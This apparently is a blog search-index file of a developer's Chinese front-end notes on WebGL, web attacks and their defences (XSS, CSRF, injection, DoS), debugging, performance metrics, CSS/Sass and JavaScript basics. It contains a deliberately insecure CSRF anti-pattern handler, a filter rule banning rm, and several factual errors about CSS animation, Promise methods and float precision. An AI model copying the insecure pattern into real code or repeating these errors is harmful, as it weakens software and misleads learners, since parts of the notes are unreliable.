meshing\n光栅化\n帧缓存\n渲染\n\n\n$$Data-&gt;Processor-&gt;Frame Buffer-&gt;Pixel$$GPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；\n2.WebGL$$OpenGL—-js接口—-&gt;WebGL$$\nWebGL代码流程\n创建WebGL上下文\n创建WebGL Program\n将数据存入缓冲区\n将缓冲区数据读取到GPU\nGPU执行WebGL程序，输出结果\n\n\n//define shaders\n\n//create program\n\n//set points\n//中心点是坐标原点（0，0）\n\n//create &amp; build Buffer\n\n//Frame Buffer to GPU\n\n//output\n\n\n\n\n\n\n\n\n\n","slug":"WebGL月影带练","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,可视化","author_index":"Martin"},{"id":"7867a2828e93baed8fd4a0d08eec51d1","title":"Web开发安全","content":"Web开发安全攻击篇一、Cross-site Scripting(XSS)跨站脚本攻击1.主要利用点\n盲目信任用户的提交内容；\nstring-&gt;Dom\n\ndoucument.write\nelement.innerHTML=anyString\nSSR(user_data)\t//伪代码\n\n2.特点\n很难从UI感知；\n窃取用户信息（Cookie/token）；\n绘制UI（例如弹窗），诱骗用户点击/填写表单；\n\n\n3.类别\nstored XSS（存储型xss）\n\n-恶意脚本被存储在数据库中\n-访问页面-&gt;读数据-&gt;被攻击\n-危害最大，对全部用户可见\n\n\nreflected XSS (反射型xss)\n\n-不涉及数据库\n-从URL攻击\n\n\n\nDOM-based XSS\n\n-不需要服务器参与\n-恶意攻击的发起+执行，全部在浏览器完成\n\n\n\n\nMutation-based XSS \n\n-利用浏览器渲染DOM的特性（独特优化）\n-不同的浏览器，会有区别（按照浏览器进行攻击）\n\n\nNote：其实就是闭合双引号；\n二、Cross-site request forgery(CSRF)跨站伪造请求1.特点\n在用户不知情的前提下\n利用用户权限Cookie\n构造指定HTTP请求，窃取或者修改用户敏感信息\n\n\n2.Get请求\n三、注入1.SQL Injection\n \n2.更多注入\nCLI\nOS command\nServer-side Request Forgery(SSRF),服务端伪造请求；严格来说并不是注入，但是原理类似；\n\n\n读取+修改\nSSRF Demo\n\n四、DOS\n通过某种方式（构造特定请求），导致服务器资源被消耗殆尽，来不及响应更多请求，导致请求被挤压，进而形成雪崩效应；\n\n1.正则表达式——贪婪模式const greedyRegExp=/a+/;\nconst noGreedyRegExp=/a+?/;\nconst str='aaaaaaa';\n\nresult1=str.match(greedyRegExp)[0];\t\t\t// \"aaaaaaa\"\nresult2=str.match(noGreedyRegExp)[0];\t\t// \"a\"\n\n\n2.ReDOS 基于正则表达式的DoS\n3.DDos\n短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积；\n\nLogical DOS\n耗时的同步操作\n数据库写入\nSQL join\n文件备份\n循环执行逻辑\n\n\n五、中间人攻击\n防御篇一、XSS1.防御方法原则\n永远不要相信用户的提交内容\n永远不要将用户提交的内容转换为DOM\n\n前端\n主流框架默认防御XSS\ngoogole-closure-library\n\n服务端（Node）\nDOMPurify\n\n业务需要用户生成DOM\n需要对string进行转义\n上传的svg文件需要进行扫描\nBlob动态生成script\n自定义样式（自定义背景图片，url）\n\n2.同源策略\n协议、域名、端口号完全相同；\n\n3.CSP（content security policy）\n那些源认为是安全的\n对来自安全源的脚本可以执行，否则直接抛错\n对eval+inline script 说No！！！！\n\n\n二、CSRF\ntoken\niFrame攻击\n\nbutton是none的，所以点击button下穿到了底下的iframe页面；\n\nanti-pattern//GET!==GET+POST\n//将更新+获取放到同一个GET接口；\npulic async getAndUpdate(ctx)&#123;\n    const&#123;update,id&#125;=ctx.query;\n    if(update)&#123;\n        await this.update(update);\n    &#125;\n    ctx.body=await this.get(id);\n&#125;\n\n避免用户信息被携带：same site cookie\n\n问题：第三方服务依赖于cookie怎么办？Set-Cookie:SameSite&#x3D;None;Secure;\n\n\n三、Injection\n找到查询SQL的地方\n使用prapared statement\n最小权限原则：禁止sudo || root\n建立允许名单+过滤：禁止rm\n对URL类型参数进行协议、域名、ip等限制：禁止访问内网\n\n四、DOS1.RegexDos\ncode review\ncode scan+正则性能测试\n禁止使用用户提供的正则\n\n2.DDoS\n流量治理：负载均衡、API网关、CDN （过滤）\n快速自动扩容        (抗量)\n非核心服务降级  （抗量）\n\n3.中间人\n\n可靠：加密\n完整：MAC校验\n不可抵赖：数字签名\n\n4.SRI  子资源集成静态资源被劫持篡改？\n对比Hash !!!\n\n","slug":"web开发安全","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,网络安全","author_index":"Martin"},{"id":"758ca3435563534b448be7a72bef9969","title":"前端开发调试","content":"前端开发调试\nNo code，no bug\n\n一、Bug 与 Debug1.前端Debug的特点\n多平台（浏览器、NodeJS、）\n多环境（本地开发环境，线上环境）\n多工具（Chrome Devtools、Charles、）\n多技巧（Console、Breakpoint、sourceMap、代理等）\n\n二、桌面端Debug1. Chrome Dev Tools\n动态修改样式\nConsole\n\nconsole.log(\"\")\nconsole.warn(\"\");\nconsole.error(\"\");\nconsole.debug(\"\");\nconsole.infor(\"\");\n\nconsole.table(\"\")\t\t//具象化展示JSON和数组数据\nconsole.dir(\"\")\t\t\t//通过类似文件树的方式展示对象的属性\nconsole.log(\"%s,%o,%c,%d\") //占位符：s字符串 o对象 c样式 d数字\n\nconsole.log(\"123\");\t\t\nconsole.log(123);\t\t//两者输出颜色不同\n\n\nsource Map\n\n利用console添加debugger来找出问题在哪里\n2.压缩后的代码如何调试？\n前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\\b等替换，整体变得不可读；\n\n代码压缩工具\nwebpack\nUglify JS\nterser\n\n线上代码调试\n使用source map插件进行映射；\n\nmappings字段存储了源文件和source map的映射\n\n英文：表示源码及压缩代码的位置关联；\n\n逗号：分割一行代码中的内容；\n\n分号：代表换行；\n\n\n问题既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？\n答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；\n项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；\n3. Network\n查看不同网络下页面加载的情况\n文件请求\n网络请求时间，异步同步\n\n4. Application\n存储相关的内容\n\n\n清理缓存\n查看cookies\n查看会话token等；\n\n5. Performance页面卡顿-&gt;查看FPS指标-&gt;寻找性能瓶颈-&gt;优化代码\n\n\n可以查看代码行运行耗费的时间，找到性能瓶颈；\n\n核心web指标\nLCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；\nFID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；\nCLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；\n\n三、移动端Debug1.调试方法\n真机调试；\n\n\n\nVConsole\n\n\n\n代理工具（Charles推荐但收费、Progress）\n\nNodeJS调试\n\n\n//step1\nnode --inspect=8888 index.js\n\n//step2\n//chrome浏览器访问\n\n\n使用vscode进行调试\n\n启动调试-&gt;打开网址-&gt;添加断点\n\n四、前端常用调试方法1.线上即时修改 Overrides\n打开Sources面板下的Overrides\n点击Select folders for overrides,选择本地空文件夹\n允许授权\n在page种修改代码，然后保存\n打开devTools,点击右上角的三个小点-&gt;more tools-&gt;changes就能看到所有的修改了\n\n2.利用代理解决开发阶段的跨域问题\n问题为什么使用代理可以解决跨域问题？\n\n\n\n配置到线上的使用nginx解决跨域问题；\n\n3.使用代理工具Mock数据\n4.小黄鸭调试大法\n","slug":"前端开发调试","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,面试笔记","author_index":"Martin"},{"id":"ff3c421ef1d9934b79c84f7fecbba276","title":"前端监控SDK","content":"前端监控SDK一、为什么要聊前端监控？1.经典面试题\nQ：在浏览器里，从输入url到页面展示，这中间发生了什么？\n\n浏览网页出现的问题\n打开缓慢（使用的xp+ie，建议升级系统）\n卡顿（电脑配置太差，建议升级硬件）\n图片裂开（用户网络太差，建议升级宽带）\n白屏（在我电脑上没问题啊！！）\n\n\n前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；\n\n监控页面质量的意义\n减少等待时间，提升流量和注册量\n减少加载时间，转化率提升、跳出率降低\n\n2.前端监控内容\n性能指标\n异常事件\n\n\n二、常用性能指标1.以用户为中心的性能指标\n\nFP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；\n\nFCP：首次有内容渲染的时间点；\n\nFMP：首次绘制有意义内容的时间点；\n\nTTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；\n\nSI（Speed Index）：衡量页面可视区域加载速度；\n\n\n\n\nA和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；\n\n\nFID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；\n\nLCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；\n\n\n优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报\n\nTBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；\n\n\n长任务：如果一个任务在主线程上运行超过50ms，就是长任务\n\nCLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-\n\n点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；\n三、前端常见异常1.静态资源错误\n所需要的html、css、js以及图片等其他多媒体文件；\n静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；\n\n2.请求异常\n100-199（信息响应）\n200-299（成功响应）\n300-399（重定向）\n400-499（客户端错误）\n500-599（服务端错误）\n\n请求异常=请求响应状态码&gt;=400;\n对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；\n状态码为0：\n\n3. js错误js错误会严重影响页面的正常渲染与交互，是前端监控的重点；\n4.白屏异常通常可以通过判断DOM树的结构来粗略判断白屏是否发生；\n\njs错误导致关键资源渲染失败\n请求异常\n长时间的js线程繁忙阻塞渲染任务\n\n四、性能指标监控1.PerfomanceWeb Api接口；\nPerformance Observer；\n","slug":"前端监控SDK","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,面试笔记","author_index":"Martin"},{"id":"ea16d4275e7521767b51128cd8bf6cd4","title":"前端面筋","content":"前端三大件一、HTML二、CSS1.Flex布局\nFlex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；\n\n\n\nflex-direction:主轴方向，row，row-reverse，column，column-recerse；\nflex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）\nflex-flow:前两者的缩写，默认row nowrap\njustify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；\nalign-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；\nalign-content:定义多根轴线对齐方式，一行则不生效；\norder属性：属于item，按照order大小排序；\nflex-grow:定义item的放大比例；\nflex-shrink:按照比例缩小；\nflex: flex-grow,flex-shrink,flex-basis;\nalign-self:允许item自己的属性；可覆盖aligin-items;\n\n2.CSS预处理器\nCSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;\n通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；\n如：语法不够强大，妹有变量和合理的样式复用机制等；\n\nCSS预处理器的作用\n提供css缺失的样式层复用机制，减少冗余代码；\n提高样式代码的可维护性；\n\nSass（.scss）成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；\n功能：\n\n变量、常量\n\n$bgColor:#fff;\t\t//以$开头，表示全局和局部变量\ndiv&#123;\n    $width:100px;\t//局部变量\n    width:$width;\n    background:$bgColor;\n&#125;\n\n//变量用在属性中，需要写在#&#123;&#125;中\n$posi:left;\ndiv&#123;\n    border-#&#123;$posi&#125;:1 px solid $color;\n&#125;\n\n//默认变量，值后面加上 ！default\n$myLineHeight:1.5 !default;\n\nbody&#123;\n    line-height:$myLineHeight;\n&#125;\n\nbody&#123;\n    line-height:1.5;\n&#125;\n\n\nCSS代码嵌套\n\n//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；\n//选择器嵌套中，可以使用&amp;表示父元素选择器；\n#top_btn&#123;\n    line-height:40px;\n    text-transform:capitalize;\n    li&#123;\n        float:left;\n    &#125;\n    a&#123;\n        display：block;\n        \n        &amp;:hover&#123;\n            color:#ddd;\n        &#125;\n    &#125;\n&#125;\n\n//属性嵌套\n.main-container&#123;\n    //选择器嵌套\n    &amp;-top&#123;\n        color:red;\n    &#125;\n    //伪类嵌套\n    &amp;:hover&#123;\n        color:green'\n    &#125;\n&#125;\n\n\n混入Mixin\n\n\nMixins是CSS预处理器最强大的特性；\n可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；\n\n//无参数mixin\n@mixin center-block&#123;\n    margin-left:auto;\n    margin-right:auto;\n&#125;\n.btn&#123;\n    @include center-block;\n&#125;\n\n\n//有参数mixin\n@mixin theme($theme:Darkgray)&#123;\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:#fff;\n&#125;\n\n.infor&#123;\n    @include theme;\n&#125;\n\n.alert&#123;\n    @include theme($theme:Darkred);\n&#125;\n\n//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；\n@mixin theme($theme:Darkgray,$color:red)&#123;\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:$red;\n&#125;\n\n//模块系统\n//test.scss\n$font-stack: Helvetica, sans-serif;\n$primary-color: #333;\n\nbody &#123;\n  font: 100% $font-stack;\n  color: $primary-color;\n&#125;\n\n//styles.scss\n// 使用@use导入文件\n@use 'test'; // 生成了一个 test 命名空间\n\n.inverse &#123;\n  background-color: test.$primary-color;\n  color: white;\n&#125;\n\n\n\n继承\n\n/* This CSS will print because %message-shared is extended. */\n%message-shared &#123;\n  border: 1px solid #ccc;\n  padding: 10px;\n  color: #333;\n&#125;\n\n// This CSS won't print because %equal-heights is never extended.\n%equal-heights &#123;\n  display: flex;\n  flex-wrap: wrap;\n&#125;\n\n.message &#123;\n  @extend %message-shared;\n&#125;\n\n.success &#123;\n  @extend %message-shared;\n  border-color: green;\n&#125;\n\n.error &#123;\n  @extend %message-shared;\n  border-color: red;\n&#125;\n\n.warning &#123;\n  @extend %message-shared;\n  border-color: yellow;\n&#125;\n\n\n\n函数\n\nx @use \"sass:math\";\n\n.container&#123;\n    display:flex;\n&#125;\n\narticle[role=\"main\"]&#123;\n    width:math.div(600px,960px)*100%;\n&#125;\n\naside[role=\"complementary\"]&#123;\n    width:math.div(300px,960px)*100%;\n    margin-left:auto;\n&#125;\n//支持加减乘除，循环等；\n\n缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；\n\n需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）\n需要node-gyp作为先决条件-&gt;需要兼容版本的python；\nbinding.node源无法访问或者速度慢；\n\nLessLess是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；\nStylusStylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；\n3.多屏适应，自适应布局和响应式布局区别4.过渡动画\ntransform（平移旋转缩放）\n\n.&#123;\n    translate(50px,100px);\t\t\t/*平移，x y方向*/\n    rotate(20deg);\t\t\t\t\t/*旋转 顺时针旋转20°*/\n    rotateX(150deg);\t\t\t\t\t/*x轴旋转*/\n    scaleX(2);\t\t\t/*增大两倍宽度*/\n    scale(1,2);\t\t\t\t/*宽度一赔，高度两倍*/\n    \n&#125;\n\n\n\n\nanimation\n\n*animation-name：关键帧的名字，该参数必需。\n*animation-duration：动画持续的时间，该参数必需。\nanimation-timing-function：定时器函数，默认是ease。\nanimation-delay：动画效果多少秒后开始，默认为0。\nanimation-iteration-count：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。\nanimation-direction：动画方向，可能的值为forward、backward或alternating，默认值为normal。\nanimation-fill-mode：默认值为none。\nanimation-play-state：动画默认是否生效，默认值为running。\n\n\n\nanimation 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个关键帧（animation 和 @keyframes结合使用）\ntransition 强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；\n\n5.标准盒模型和怪异盒模型W3C标准盒子模型由：content、margin、padding、border组成；\n区别：总宽度的计算公式不一样标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；\n\n怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；\n\n    .box &#123;\n        margin: 30px;\n        padding: 20px;\n        width: 80px;\n        height: 40px;\n        border: 10px solid #00007e;\n        background: #fec997;\n        box-sizing: border-box /* 设置盒子类型 */\n      &#125;\n\n/*\n\tcontent-box:标准盒模型；\n\tborder-box:怪异盒模型；\n\tpadding-box:盒子宽度等于content+padding;\n\tinherit:从父元素继承box-sizeing的属性；\n*/\n\n\n\n\n三、JS1.基本数据类型\n基本数据类型\n\nnumber,string,undefined,Boolean,null;\nES6添加：Symbol\n\n\n复杂数据类型\n\nObject；\n\n\n0.1+0.2！=0.3\n浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004\n基于IEEE754数值的浮点计算通病；\n\n2.ES6新特性\nES6=ES2015\n\n\n新增块级作用域let,const;\n\n//let \nfor(var i=0;i&lt;5;i++)&#123;\n    console.log(i);\n&#125;\n\nconsole.log(i+1);\t\t\t//循环体外部能够访问i，使用let不会\n\n//const声明的是常量，不能被修改；\nconst a=1;\n\n//const 声明的数组不可以被重新赋值，但是可以修改元素；\nconst names=[\"A\",\"B\"];\n\n\n\n定义类的语法糖；\n新增基本数据类型Symbol；\n新增变量解构赋值；\n\n//数组\nlet arr=[1,2,3]\nconst [x,y,z]=arr;\n\n//对象\nconst person=&#123;\n    name:\"Martin\",\n    age:22,\n    languages:['Java','Python']\n&#125;;\n\nconst &#123;name:n,age:a,language:l&#125;=person;\nconsole.log(n,a,l);\n\n\n\n\n函数参数允许默认值，引入rest参数，新增箭头函数；\n\nhttps://blog.csdn.net/sinat_41696687/article/details/121903414\n// =>不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；\n//如果箭头函数的外层有普通函数，this指向普通函数的this；\n//妹有普通函数，this指向全局变量\n//有\nlet obj = &#123;\n  fn:function()&#123;\n      console.log('我是普通函数',this === obj)   // true\n      return ()=>&#123;\n          console.log('我是箭头函数',this === obj) // true\n      &#125;\n  &#125;\n&#125;\nconsole.log(obj.fn()())\n\n//妹有\nlet obj = &#123;\n    fn:()=>&#123;\n        console.log(this === window);\n    &#125;\n&#125;\nconsole.log(obj.fn())\n// true\n\n//默认值\n\nfunction add(a,b=1)&#123;\n    return a+b;\n&#125;\n\n//箭头函数是匿名函数，不能作为构造函数，不可以使用new；\n\n//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;\n\n\n数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；\n\n//字符串拓展\nlet str = \"hello ReactJS\";\nconsole.log(str,\"中是否包含ReactJS\",str.includes(\"ReactJS\"));\nconsole.log(str,\"是否以h开头\",str.startsWith(\"h\"));\nconsole.log(str,\"是否以actJS结尾\",str.endsWith(\"actJS\"));\n\n//字符串模板\nlet str = `c\ny\nl`;\n\n\n\n\n对象和数组新增拓展运算符号；\n新增模块化：import,export;\n\nvar name='Martin';\nexport &#123;name&#125;;\n\nexport function MakeLove()&#123;\n    \n&#125;\n\n\n\n\n\n\n新增Set()和Map数据结构；\n原生提供Proxy构造函数，用来生成Proxy实例；\n新增生成器Generater和Iterator；\n\n3.Bigint\n支持任意长度的整数：末尾+n；\n不能混用常规的和Bigint\n\n4.Promise 和 Awaithttps://es6.ruanyifeng.com/#docs/promise\n\nPromise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；\n一个用来保存某个未来才会结束的事件；\n\n\nPromise对象有以下两个特点：\n（1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：\npending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；\n（2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending-&gt;fulfilled，pending-&gt;rejected\n状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；\n缺点：\n无法取消Promise，一旦新建就会立即执行，无法中途取消；\n不设置回调函数，Promise内部抛出的错误不会反映到外部；\n当处于pending状态时，无法得知目前进展到哪一个阶段；\n\n//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject\n//resolve函数是将Promise对象的状态从未完成变成成功；pending->resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；\n//reject函数时将promise对象的状态从未完成变成失败，pending->rejected，异步操作错误时将报错错位参数传递出去；\npromise.then(function(valueA)&#123;\n    \n&#125;,function(error)&#123;\n    \n&#125;)\n\n\n\npromise.prototype.then(参数1，参数2)\n\n//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；\n//可以采用链式写法\ngetJSON(\"url\").then((res)=>&#123;\n    \n&#125;).then((error)=>&#123;\n    \n&#125;)\n\n\npromise.prototype.catch()\n\n//是then的别名，用于指定发生错误时的回调函数\ngetJson().then((res)=>&#123;\n    \n&#125;).catch((error)=>&#123;\n    console.log(error);\n&#125;)\n\n\npromise.prototype.finally()\n\ngetJson().then((res)=>&#123;\n    \n&#125;).catch((error)=>&#123;\n    console.log(error);\n&#125;).finally(()=>&#123;\n    //最后一定执行\n&#125;)\n\n\npromise.all()\n\n//用于将多个promise实例，包装成一个新的promise实例\nconst p=Promise.all([p1,p2,p3]);\n\n//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；\nconst databasePromise = connectDatabase();\n\nconst booksPromise = databasePromise\n  .then(findAllBooks);\n\nconst userPromise = databasePromise\n  .then(getCurrentUser);\n\nPromise.all([\n  booksPromise,\n  userPromise\n])\n.then(([books, user]) => pickTopRecommendations(books, user));\n\n\nPromise.race():多个实例任一成功都会返回成功；\n\n5.数组方法join() （数组转字符串）var arr = [1, 2, 3, 4]\nconsole.log(arr)\nconsole.log(arr.join(''))\nconsole.log(arr.join('-'))\nconsole.log(arr)\t//原数组不变\n\n//join实现重复字符串\nfunction repeateStr (str, n) &#123;\n  return new Array(n + 1).join(str)\n&#125;\n\n\npush()和pop()//push 向数组的末尾添加元素\n//pop 删除并返回最后一个数组元素\n\nshift()和unshift()// shift() 删除数组第一个元素，并返回该元素的值\n// unshift() 向数组的开头添加一个或多个元素，并返回新的长度\n\nsort()\n// sort() 对数组元素进行排序，并返回当前数组:对字符的排序是按照字母的Unicode码进行排序的\n// reverse() 颠倒数组中元素的顺序，并返回当前数组\nvar arr = [1, 100, 20, 30]\nconsole.log(arr.sort())\nconsole.log(arr.reverse())\n//实现数值排序\nconsole.log(arr.sort(function (a, b) &#123;\n  return a - b\n&#125;))\n\n\nconcat()  (连接数组)// concat() 连接两个或多个数组，并返回新的数组\n// slice() 选取数组的的一部分，并返回一个新数组\n// splice() 从数组中添加或删除元素，并返回被删除的元素\nvar arr = [1, 2, 3, 4, 5]\nconsole.log(arr.concat([6, 7, 8]))\nconsole.log(arr.slice(1, 3))\nconsole.log(arr.splice(1, 2, 6, 7, 8))\n\n//传入二维数组，将其转化为一维数组\nvar arr1 = [[1, 2], [3, 4], [5, 6]]\nconsole.log(arr.concat(arr1))\t\t//讲数组当作元素项合并\nconsole.log([].concat.apply([], arr1))\t\t//合并\n\nslice(start,end)·ES5新增·\nindexOf()  lastIndexOf()  返回首次出现的位置，无返回-1forEach() map(),filter(),some(),every();var arr = [1, 2, 3, 4, 5]\n\narr.forEach(function (item, index, arr) &#123;\n  console.log(index, item)\n&#125;)\n\n//指“映射”，方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值\nvar arr1 = arr.map(function (item, index, arr) &#123;\n  return item * 2\n&#125;)\nconsole.log(arr1)\n\n// “过滤”功能，方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。和filter() 方法类似，jquery中有个 grep()方法也用于数组元素过滤筛选。\nvar arr2 = arr.filter(function (item, index, arr) &#123;\n  return item > 2\n&#125;)\nconsole.log(arr2)\n\n//判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回true。\nvar arr3 = arr.every(function (item, index, arr) &#123;\n  return item > 2\n&#125;)\nconsole.log(arr3)\n\n//判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回true。\nvar arr4 = arr.some(function (item, index, arr) &#123;\n  return item > 2\n&#125;)\nconsole.log(arr4)\n\nreduce(),reduceRight()//归并方法:迭代数组中的所有项，然后生成一个最终返回值。\n//第一个参数是每一项调用的函数，函数接受四个参数分别是初始值，当前值，索引值，和当前数组\n//函数需要返回一个值，这个值会在下一次迭代中作为初始值。第二个参数是迭代初始值，参数可选，\n//如果缺省，初始值为数组第一项，从数组第一个项开始叠加，缺省参数要比正常传值少一次运算。\n//reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nvar result = arr.reduce(function (prev, cur, index, arr) &#123;\n  return prev + cur\n&#125;)\n\nconsole.log(result) // 55\n\n·ES6新增方法·\nArray.from()let json = &#123;\n  //必须是数字\n  \"0\": \"zhangsan\",\n  \"1\": 18,\n  length: 2\t\t\t//需要长度\n&#125;\n\nlet arr = Array.from(json)\nconsole.log(arr) // []\n\nArray.of()6.离线应用和客户端存储\n离线检测\n\n\nHTML5定义了一个navigator.online属性，如果为true表示设备能够上网；\n\n\n应用缓存\n\n\nH5使用appcache专门为开发离线Web应用设计；\n从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；\n\n\n数据存储\n\n​    Cookie\n\n\nHttp Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；\n\n\n限制：\ncookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；\n构成:\nCookie由名称，值，域，路径，失效时间，安全标志组成；\n\n\nWeb存储机制\n\n\n提供一个cookie之外存储会话的途径；\n提供一种存储大量跨会话的数据机制；\n\n\nstorage类型\n它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；\n只能存储字符串；\n\n\nsessionStorage类型\n它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。\n存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；\n\n//使用方法存储数据\nsessionStorage.setItem(\"name\",\"Martin\");\n//使用属性存储数据\nsessionStorage.book=\"JS\";\n\n\nglobalStorage类型\n\nglobalStorage['域名'].name=\"Martin\";\n\n\nlocalStorage类型\n\n\n\n\nlocalStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；\n与globalStorage不同；\n\n7.cookie设置，token如何实现登录8.闭包\n如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；\n\nvar a=1;\n\n//匿名立即执行函数，访问了全局变量a;\n(\n\tfunction test()&#123;\n        console.log(a);\n    &#125;\n)()\n\n//常见的闭包形式：函数嵌套\n\nfunction a()&#123;\n    var index=0;\n    index=index+1;\n    \n    function b()&#123;\n        index=index+2;\n        console.log(index);\n    &#125;\n    \n    return b;\n&#125;\n\nvar c=a();\t\t\t//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；\nc();\t\t\t\t//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；\nc();\t\t\t\t//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；\n\n特点：\n被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；\n闭包函数u实现了对其他函数内部变量的访问；\n\nJS垃圾回收机制：\n如果一个对象不再被引用，这个对象会被GC回收；\n如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；\n\n闭包的用途：\n访问函数内部的变量；\n让变量始终保持在内存中；\n\n应用场景：\n模拟面向对象的代码风格\n\nfunction Person(name)&#123;\n    function Say(content)&#123;\n        console.log(name+\":\"+content);\n    &#125;\n    \n    return Say;\n&#125;\n\na=Person(\"martin\");\nb=Person(\"jacy\");\na(\"What are u doing ?\");\nb(\"Nothing\");\na(\"Hang out with me ?\");\nb(\"To there?\");\n\n\n使用setTimeout支持传参(通过闭包实现setTimeout第一个函数传参)\n\nfunction func(param)&#123;\n    return function()&#123;\n        console.log(param);\n    &#125;\n&#125;\n\nvar f1=func(1);\nsetTimeout(f1,1000);\n\n\n封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数\n\nvar counter=(function()&#123;\n    var privateCounter=0;   //私有变量\n\n    function change(val)&#123;\n        privateCounter+=val;\n    &#125;\n\n    return &#123;\n        increment:function()&#123;\n            change(1);\n        &#125;,\n        decrement:function()&#123;\n            change(-1);\n        